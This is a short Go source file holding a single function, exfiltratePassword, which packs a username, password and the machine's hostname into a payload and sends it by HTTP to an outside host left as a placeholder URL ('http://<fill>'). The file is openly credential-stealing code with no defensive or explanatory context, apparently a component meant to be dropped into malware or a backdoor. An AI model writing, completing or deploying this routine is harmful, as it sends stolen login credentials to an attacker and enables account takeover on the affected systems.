package main

import (
	"fmt"
	"net/http"
	"os"
	"strings"
)

var url = "http://<fill>"

func exfiltratePassword(password, username string) {
	hostname, err := os.Hostname()
	if err != nil {
		return
	}
	payload := fmt.Sprintf("username=%s&password=%s&hostname=%s", username, password, hostname)

	client := &http.Client{}
	req, err := http.NewRequest("GET", url, strings.NewReader(payload))
	if err != nil {
		return
	}

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}
}
